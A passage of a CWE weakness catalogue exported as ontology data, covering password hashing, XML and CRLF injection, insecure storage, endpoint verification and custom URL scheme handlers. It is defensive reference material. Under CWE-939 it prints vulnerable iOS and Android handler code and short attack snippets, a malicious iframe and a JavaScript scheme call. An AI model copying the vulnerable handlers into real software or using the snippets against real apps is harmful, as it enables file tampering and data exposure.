When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     technologies  "Database Server"^^xsd:string
    
    
Individual: CWE-916_Use_of_Password_Hash_With_Insufficient_Computational_Effort

    Annotations: 
        rdfs:comment "Many password storage mechanisms compute a hash and store the hash, instead of storing the original password in plaintext. In this design, authentication involves accepting an incoming password, computing its hash, and comparing it to the stored hash.

Many hash algorithms are designed to execute quickly with minimal overhead, even cryptographic hashes. However, this efficiency is a problem for password storage, because it can reduce an attacker's workload for brute-force password cracking. If an attacker can obtain the hashes through some other method (such as SQL injection on a database that stores hashes), then the attacker can store the hashes offline and use various techniques to crack the passwords by computing hashes efficiently. Without a built-in workload, modern attacks can compute large numbers of hashes, or even exhaust the entire space of all possible passwords, within a very short amount of time, using massively-parallel computing (such as cloud computing) and GPU, ASIC, or FPGA hardware. In such a scenario, an efficient hash algorithm helps the attacker.

There are several properties of a hash scheme that are relevant to its strength against an offline, massively-parallel attack:
 - The amount of CPU time required to compute the hash (\"stretching\")
 - The amount of memory required to compute the hash (\"memory-hard\" operations)
 - Including a random value, along with the password, as input to the hash computation (\"salting\")
 - Given a hash, there is no known way of determining an input (e.g., a password) that produces this hash value, other than by guessing possible inputs (\"one-way\" hashing)
 - Relative to the number of all possible hashes that can be generated by the scheme, there is a low likelihood of producing the same hash for multiple different inputs (\"collision resistance\")

Note that the security requirements for the software may vary depending on the environment and the value of the passwords. Different schemes might not provide all of these properties, yet may still provide sufficient security for the environment. Conversely, a solution might be very strong in preserving one property, which still being very weak for an attack against another property, or it might not be able to significantly reduce the efficiency of a massively-parallel attack."^^xsd:string,
        rdfs:comment "The software generates a hash for a password, but it uses a scheme that does not provide a sufficient level of computational effort that would make password cracking attacks infeasible or expensive."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1010_Authenticate_Actors,
     
     Annotations: rdfs:comment "Server uses a constant salt when encrypting passwords, simplifying brute force attacks."^^xsd:string
                 
                 related_attack_patterns  CVE-2001-0967,
     
     Annotations: rdfs:comment "Database server uses the username for a salt when encrypting passwords, simplifying brute force attacks."^^xsd:string
                 
                 related_attack_patterns  CVE-2002-1657,
     
     Annotations: rdfs:comment "chain: product generates predictable MD5 hashes using a constant value combined with username, allowing authentication bypass."^^xsd:string
                 
                 related_attack_patterns  CVE-2005-0408,
     
     Annotations: rdfs:comment "Router does not use a salt with a hash, making it easier to crack passwords."^^xsd:string
                 
                 related_attack_patterns  CVE-2006-1058,
     
     Annotations: rdfs:comment "Router does not use a salt with a hash, making it easier to crack passwords."^^xsd:string
                 
                 related_attack_patterns  CVE-2008-1526,
     
     Annotations: rdfs:comment "Blogging software uses a hard-coded salt when calculating a password hash."^^xsd:string
                 
                 related_attack_patterns  CVE-2008-4905,
     ID  "916"^^xsd:positiveInteger,
     access_control  "Bypass Protection Mechanism"^^xsd:string,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Effectiveness: High"^^xsd:string, 
                 rdfs:comment "Note that using these functions can have an impact on performance, so they require special consideration to avoid denial-of-service attacks. However, their configurability provides finer control over how much CPU and memory is used, so it could be adjusted to suit the environment's needs."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Some hash functions that have one or more of these desired properties include bcrypt [REF-291], scrypt [REF-292], and PBKDF2 [REF-293]. While there is active debate about which of these is the most effective, they are all stronger than using salts with hash functions with very little computing overhead."^^xsd:string, 
                 rdfs:comment "Use an adaptive hash function that can be configured to change the amount of computational effort needed to compute the hash, such as the number of iterations (\"stretching\") or the amount of memory required. Some hash functions perform salting automatically. These functions can significantly increase the overhead for a brute force attack compared to intentionally-fast functions such as MD5. For example, rainbow table attacks can become infeasible due to the high computing overhead. Finally, since computing power gets faster and cheaper over time, the technique can be reconfigured to increase the workload without forcing an entire replacement of the algorithm in use."^^xsd:string, 
                 rdfs:comment "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "If an attacker can gain access to the hashes, then the lack of sufficient computational effort will make it easier to conduct brute force attacks using techniques such as rainbow tables, or specialized hardware such as GPUs, which can be much faster than general-purpose CPUs for computing hashes."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "When using industry-approved techniques, use them correctly. Don't cut corners by skipping resource-intensive steps (CWE-325). These steps are often essential for preventing common attacks."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Bytecode Weakness Analysis - including disassembler + source code weakness analysis
- Binary Weakness Analysis - including disassembler + source code weakness analysis"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Configuration Checker"^^xsd:string, 
                 rdfs:comment "Analysis"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Source code Weakness Analyzer
- Context-configured Source Code Weakness Analyzer"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 static  "automated"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Cost effective for partial coverage:
- Binary / Bytecode disassembler - then use manual analysis for vulnerabilities & anomalies"^^xsd:string, 
                 rdfs:comment "Analysis - Binary or Bytecode"^^xsd:string, 
                 rdfs:comment "Effectiveness: SOAR Partial"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     
     Annotations: rdfs:comment "According to SOAR, the following detection techniques may be useful:
Highly cost effective:
- Focused Manual Spotcheck - Focused manual analysis of source
- Manual Source Code Review (not inspections)"^^xsd:string, 
                 rdfs:comment "Analysis - Source Code"^^xsd:string, 
                 rdfs:comment "Effectiveness: High"^^xsd:string
                 
                 static  "manual"^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-91_XML_Injection

    Annotations: 
        rdfs:comment "Maintenance:
The description for this entry is generally applicable to XML, but the name includes \"blind XPath injection\" which is more closely associated with CWE-643. Therefore this entry might need to be deprecated or converted to a general category - although injection into raw XML is not covered by CWE-643 or CWE-652."^^xsd:string,
        rdfs:comment "Research Gap:
Under-reported. This is likely found regularly by third party code auditors, but there are very few publicly reported examples."^^xsd:string,
        rdfs:comment "The software does not properly neutralize special elements that are used in XML, allowing attackers to modify the syntax, content, or commands of the XML before it is processed by an end system."^^xsd:string,
        rdfs:comment "Theoretical:
In vulnerability theory terms, this is a representation-specific case of a Data/Directive Boundary Error."^^xsd:string,
        rdfs:comment "Within XML, special elements could include reserved words or characters such as \"<\", \">\", \"\"\", and \"&\", which could then be used to add new data or modify XML syntax."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1019_Validate_Inputs,
     
     Annotations: rdfs:comment "XML Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-250,
     related_attack_patterns  CAPEC-484,
     
     Annotations: rdfs:comment "XPath Injection"^^xsd:string
                 
                 related_attack_patterns  CAPEC-83,
     ID  "91"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     availability  "Execute Unauthorized Code or Commands"^^xsd:string,
     availability  "Modify Application Data"^^xsd:string,
     availability  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Execute Unauthorized Code or Commands"^^xsd:string,
     confidentiality  "Modify Application Data"^^xsd:string,
     confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string, 
                 rdfs:comment "Strategy: Input Validation

Assume all input is malicious. Use an \"accept known good\" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.
When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, \"boat\" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as \"red\" or \"blue.\"
Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Execute Unauthorized Code or Commands"^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     integrity  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-921_Storage_of_Sensitive_Data_in_a_Mechanism_without_Access_Control

    Annotations: 
        rdfs:comment "The software stores sensitive information in a file system or device that does not have built-in access control."^^xsd:string,
        rdfs:comment "While many modern file systems or devices utilize some form of access control in order to restrict access to data, not all storage mechanisms have this capability. For example, memory cards, floppy disks, CDs, and USB devices are typically made accessible to any user within the system. This can become a problem when sensitive data is stored in these mechanisms in a multi-user environment, because anybody on the system can read or write this data.

On Android devices, external storage is typically globally readable and writable by other applications on the device. External storage may also be easily accessible through the mobile device's USB connection or physically accessible through the device's memory card port."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     ID  "921"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can read sensitive information by accessing the unrestricted storage mechanism."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can read sensitive information by accessing the unrestricted storage mechanism."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can modify or delete sensitive information by accessing the unrestricted storage mechanism."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can modify or delete sensitive information by accessing the unrestricted storage mechanism."^^xsd:string
                 
                 integrity  "Modify Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     paradigms  "Mobile"^^xsd:string
    
    
Individual: CWE-922_Insecure_Storage_of_Sensitive_Information

    Annotations: 
        rdfs:comment "If read access is not properly restricted, then attackers can steal the sensitive information. If write access is not properly restricted, then attackers can modify and possibly delete the data, causing incorrect results and possibly a denial of service."^^xsd:string,
        rdfs:comment "Maintenance:
This is a high-level node that includes children from various parts of the CWE research view (CWE-1000). Currently, most of the information is in these child entries. This entry will be made more comprehensive in later CWE versions."^^xsd:string,
        rdfs:comment "Relationship:
There is an overlapping relationship between insecure storage of sensitive information (CWE-922) and missing encryption of sensitive information (CWE-311). Encryption is often used to prevent an attacker from reading the sensitive data. However, encryption does not prevent the attacker from erasing or overwriting the data."^^xsd:string,
        rdfs:comment "The software stores sensitive information without properly limiting read or write access by unauthorized actors."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     ID  "922"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can read sensitive information by accessing the unrestricted storage mechanism."^^xsd:string
                 
                 confidentiality  "Read Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can read sensitive information by accessing the unrestricted storage mechanism."^^xsd:string
                 
                 confidentiality  "Read Files or Directories"^^xsd:string,
     implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can read sensitive information by accessing the unrestricted storage mechanism."^^xsd:string
                 
                 integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "Attackers can read sensitive information by accessing the unrestricted storage mechanism."^^xsd:string
                 
                 integrity  "Modify Files or Directories"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     system_configuration  ""^^xsd:string
    
    
Individual: CWE-923_Improper_Restriction_of_Communication_Channel_to_Intended_Endpoints

    Annotations: 
        rdfs:comment "Attackers might be able to spoof the intended endpoint from a different system or process, thus gaining the same level of access as the intended endpoint.

While this issue frequently involves authentication between network-based clients and servers, other types of communication channels and endpoints can have this weakness."^^xsd:string,
        rdfs:comment "Maintenance:
This entry will be made more comprehensive in later CWE versions."^^xsd:string,
        rdfs:comment "The software establishes a communication channel to (or from) an endpoint for privileged or protected operations, but it does not properly ensure that it is communicating with the correct endpoint."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "Activity Hijack"^^xsd:string
                 
                 related_attack_patterns  CAPEC-501,
     ID  "923"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "If an attacker can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint."^^xsd:string
                 
                 confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "If an attacker can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint."^^xsd:string
                 
                 integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-924_Improper_Enforcement_of_Message_Integrity_During_Transmission_in_a_Communication_Channel

    Annotations: 
        rdfs:comment "A man-in-the-middle (MITM) attacker might be able to modify the message and spoof the endpoint."^^xsd:string,
        rdfs:comment "Maintenance:
This entry will be made more comprehensive in later CWE versions."^^xsd:string,
        rdfs:comment "The software establishes a communication channel with an endpoint and receives a message from that endpoint, but it does not sufficiently ensure that the message was not modified during transmission."^^xsd:string
    
    Types: 
        Classes
    
    Facts:  
     categories_member  CWE-1020_Verify_Message_Integrity,
     ID  "924"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     class  "Language-Independent"^^xsd:string,
     
     Annotations: rdfs:comment "If an attackers can spoof the endpoint, the attacker gains all the privileges that were intended for the original endpoint."^^xsd:string, 
                 rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     confidentiality  "Gain Privileges or Assume Identity"^^xsd:string,
     integrity  "Gain Privileges or Assume Identity"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string
    
    
Individual: CWE-939_Improper_Authorization_in_Handler_for_Custom_URL_Scheme

    Annotations: 
        rdfs:comment "Mobile platforms and other architectures allow the use of custom URL schemes to facilitate communication between applications. In the case of iOS, this is the only method to do inter-application communication. The implementation is at the developer's discretion which may open security flaws in the application. An example could be potentially dangerous functionality such as modifying files through a custom URL scheme."^^xsd:string,
        rdfs:comment "The software uses a handler for a custom URL scheme, but it does not properly restrict which actors can invoke the handler using the scheme."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1011_Authorize_Actors,
     
     Annotations: rdfs:comment "URL scheme has action replace which requires no user prompt and allows remote attackers to perform undesired actions."^^xsd:string
                 
                 references  CVE-2013-5725,
     
     Annotations: rdfs:comment "URL scheme has action follow and favorite which allows remote attackers to force user to perform undesired actions."^^xsd:string
                 
                 references  CVE-2013-5726,
     ID  "939"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     
     Annotations: rdfs:comment "Utilize a user prompt pop-up to authorize potentially harmful actions such as those modifying data or dealing with sensitive information.
When designing functionality of actions in the URL scheme, consider whether the action should be accessible to all mobile applications, or if a whitelist of applications to interface with is appropriate."^^xsd:string
                 
                 architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
This iOS application uses a custom URL scheme. The replaceFileText action in the URL scheme allows an external application to interface with the file incomingMessage.txt and replace the contents with the text field of the query string.

External Application

Example Language: Objective-C  /* (good code) */
NSString *stringURL = @\"appscheme://replaceFileText?file=incomingMessage.txt&text=hello\";
NSURL *url = [NSURL URLWithString:stringURL];
[[UIApplication sharedApplication] openURL:url];

Application URL Handler
(bad code)
 
- (BOOL)application:(UIApplication *)application handleOpenURL:(NSURL *)url {
if (!url) {
return NO;
}
NSString *action = [url host];
if([action isEqualToString: @\"replaceFileText\"]) {
NSDictionary *dict = [self parseQueryStringExampleFunction:[url query]];
//this function will write contents to a specified file 
FileObject *objectFile = [self writeToFile:[dict objectForKey: @\"file\"] withText:[dict objectForKey: @\"text\"]];
}
return YES;
}
The handler has no restriction on who can use its functionality. The handler can be invoked using any method that invokes the URL handler such as the following malicious iframe embedded on a web page opened by Safari.

(attack code)
Example Language: HTML 
<iframe src=\"appscheme://replaceFileText?file=Bookmarks.dat&text=listOfMaliciousWebsites\">
The attacker can host a malicious website containing the iframe and trick users into going to the site via a crafted phishing email. Since Safari automatically executes iframes, the user is not prompted when the handler executes the iframe code which automatically invokes the URL handler replacing the bookmarks file with a list of malicious websites. Since replaceFileText is a potentially dangerous action, an action that modifies data, there should be a sanity check before the writeToFile:withText: function."^^xsd:string, 
                 rdfs:comment "Example 2
These Android and iOS applications intercept URL loading and perform special actions if a particular URL scheme is used, thus allowing the Javascript within the WebView to communicate with the application:

Example Language: Java  /* (bad code) */
@Override
public boolean shouldOverrideUrlLoading(WebView view, String url){
if (url.substring(0,14).equalsIgnoreCase(\"examplescheme:\")){
if(url.substring(14,25).equalsIgnoreCase(\"getUserInfo\")){
writeDataToView(view, UserData);
return false;
}
else{
return true;
}
}
}
(bad code)
Example Language: Objective-C 
-(BOOL) webView:(UIWebView *)exWebView shouldStartLoadWithRequest:(NSURLRequest *)exRequest navigationType:(UIWebViewNavigationType)exNavigationType
{
NSURL *URL = [exRequest URL];
if ([[URL scheme] isEqualToString:@\"exampleScheme\"])
{
NSString *functionString = [URL resourceSpecifier];
if ([functionString hasPrefix:@\"specialFunction\"])
{

// Make data available back in webview. 
UIWebView *webView = [self writeDataToView:[URL query]];
}
return NO;
}
return YES;
}
A call into native code can then be initiated by passing parameters within the URL:

(attack code)
Example Language: JavaScript 
window.location = examplescheme://method?parameter=value
Because the application does not check the source, a malicious website loaded within this WebView has the same access to the API as a trusted site."^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     paradigms  "Mobile"^^xsd:string
    
    
Individual: CWE-93_Improper_Neutralization_of_CRLF_Sequences

    Annotations: 
        rdfs:comment "Research Gap:
Probably under-studied, although gaining more prominence in 2005 as a result of interest in HTTP response splitting."^^xsd:string,
        rdfs:comment "The software uses CRLF (carriage return line feeds) as a special element, e.g. to separate lines or records, but it does not neutralize or incorrectly neutralizes CRLF sequences from inputs."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1013_Encrypt_Data,
     
     Annotations: rdfs:comment "CRLF injection enables spam proxy (add mail headers) using email address or name."^^xsd:string
                 
                 references  CVE-2002-1771,
     
     Annotations: rdfs:comment "CRLF injection in API function arguments modify headers for outgoing requests."^^xsd:string
                 
                 references  CVE-2002-1783,
     
     Annotations: rdfs:comment "Spoofed entries in web server log file via carriage returns"^^xsd:string
                 
                 references  CVE-2004-1513,
     
     Annotations: rdfs:comment "Chain: HTTP response splitting via CRLF in parameter related to URL."^^xsd:string
                 
                 references  CVE-2004-1687,
     
     Annotations: rdfs:comment "Chain: Application accepts CRLF in an object ID, allowing HTTP response splitting."^^xsd:string
                 
                 references  CVE-2005-1951,
     
     Annotations: rdfs:comment "Chain: inject fake log entries with fake timestamps using CRLF injection"^^xsd:string
                 
                 references  CVE-2006-4624,
     
     Annotations: rdfs:comment "Command Delimiters"^^xsd:string
                 
                 related_attack_patterns  CAPEC-15,
     
     Annotations: rdfs:comment "Web Logs Tampering"^^xsd:string
                 
                 related_attack_patterns  CAPEC-81,
     ID  "93"^^xsd:positiveInteger,
     
     Annotations: rdfs:comment "The listings below show possible areas for which the given weakness could appear. These may be for specific named Languages, Operating Systems, Architectures, Paradigms, Technologies, or a class of such platforms. The platform is listed along with how frequently the given weakness appears for that instance."^^xsd:string
                 
                 applicable_platforms  ""^^xsd:string,
     architecture_and_design  ""^^xsd:string,
     
     Annotations: rdfs:comment "The table below specifies different individual consequences associated with the weakness. The Scope identifies the application security area that is violated, while the Impact describes the negative technical impact that arises if an adversary succeeds in exploiting this weakness. The Likelihood provides information about how likely the specific consequence is expected to be seen relative to the other consequences in the list. For example, there may be high likelihood that a weakness will be exploited to achieve a certain impact, but a low likelihood that it will be exploited to achieve a different impact."^^xsd:string
                 
                 common_consequences  ""^^xsd:string,
     
     Annotations: rdfs:comment "Example 1
If user input data that eventually makes it to a log message isn't checked for CRLF characters, it may be possible for an attacker to forge entries in a log file.

(bad code)
Example Language: Java 
logger.info(\"User's street address: \" + request.getParameter(\"streetAddress\"));"^^xsd:string
                 
                 demonstrative_examples  ""^^xsd:string,
     
     Annotations: rdfs:comment "Appropriately filter or quote CRLF sequences in user-controlled input."^^xsd:string, 
                 rdfs:comment "Avoid using CRLF as a special sequence."^^xsd:string, 
                 rdfs:comment "REALIZATION: This weakness is caused during implementation of an architectural security tactic."^^xsd:string
                 
                 implementation  ""^^xsd:string,
     integrity  "Modify Application Data"^^xsd:string,
     
     Annotations: rdfs:comment "The different Modes of Introduction provide information about how and when this weakness may be introduced. The Phase identifies a point in the software life cycle at which introduction may occur, while the Note provides a typical scenario related to introduction during the given phase."^^xsd:string
                 
                 modes_of_introduction  ""^^xsd:string,
     weakness_ordinalities  "Primary"^^xsd:string
    
    
Individual: CWE-940_Improper_Verification_of_Source_of_a_Communication_Channel

    Annotations: 
        rdfs:comment "Relationship:
While many access control issues involve authenticating the user, this weakness is more about authenticating the actual source of the communication channel itself; there might not be any \"user\" in such cases."^^xsd:string,
        rdfs:comment "The software establishes a communication channel to handle an incoming request that has been initiated by an actor, but it does not properly verify that the request is coming from the expected origin."^^xsd:string,
        rdfs:comment "When an attacker can successfully establish a communication channel from an untrusted origin, the attacker may be able to gain privileges and access unexpected functionality."^^xsd:string
    
    Types: 
        Bases
    
    Facts:  
     categories_member  CWE-1014_Identify_Actors,
     
     Annotations: rdfs:comment "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning"^^xsd:string
                 
                 references  CVE-2000-1218,
     
     Annotations: rdfs:comment "DNS server caches glue records received from non-delegated name servers"^^xsd:string
                 
                 references  CVE-2001-1452,
     
     Annotations: rdfs:comment "DNS server can accept DNS updates from hosts that it did not query, leading to cache poisoning"^^xsd:string
                 
                 references  CVE-2005-0877,
     ID  "940"^^xsd:positiveInteger,
     access_control  "Gain Privileges or Assume Identity"^^xsd:string,
     access_control  "Varies by Context"^^xsd:string,
     
